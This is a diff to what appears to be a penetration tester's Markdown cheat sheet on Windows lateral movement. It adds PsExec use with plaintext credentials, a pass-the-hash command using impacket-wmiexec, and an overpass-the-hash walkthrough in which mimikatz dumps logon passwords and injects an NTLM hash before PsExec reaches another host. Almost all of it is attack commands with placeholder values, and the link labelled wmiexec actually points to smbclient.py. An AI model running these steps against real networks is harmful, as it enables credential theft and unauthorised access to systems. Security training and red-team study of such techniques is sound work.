@@ -70,18 +70,37 @@ Pre-requisites:
 Uses Sysinternals: https://learn.microsoft.com/en-us/sysinternals/
 
 ```
-C:\path\to\PsExec64.exe -i  \\targethostname -u targetdomain\targetuser -p somepass cmd
+kali $ rdesktop -u $firstUser $firstTargetIp
+cmd > C:\path\to\PsExec64.exe -i  \\targethostname -u targetdomain\targetuser -p somepass cmd
 > hostname
 > whoami
 ```
 
 ### Pass the Hash
 
+Works with servers and services using NTLM authentication, but NOT with Kerberos authentication.
+Impacket-Wmiexec on GitHub: https://github.com/fortra/impacket/blob/master/examples/smbclient.py
 ```
-/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@VictimIP
+/usr/bin/impacket-wmiexec -hashes 00000000000000000000000000000000:somelonghashstring Administrator@$VictimIP
 ```
 
 ### Overpass the Hash
+
+First, run a process as a different user with Shift-Right click, say Notepad. Then:
+```
+kali$ xfreerdp /cert-ignore /u:someuser /d:targetorg.com /p:somepass /v:somehostIp
+PS > c:\path\to\mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:targetuser /domain:targetorg.com /ntlm:somentlmstring /run:powershell
+PS2 > klist # check the cached tickets
+PS2 > net use \\otherhostname
+PS2 > klist # re-check the cached tickets
+PS2 > cd c:\path\to\psexec
+PS2 > .\PsExec.exe \\otherhostname cmd
+cmd > whoami # targetuser
+cmd > hostname # otherhostname
+```
 
 ### Pass the Ticket
 
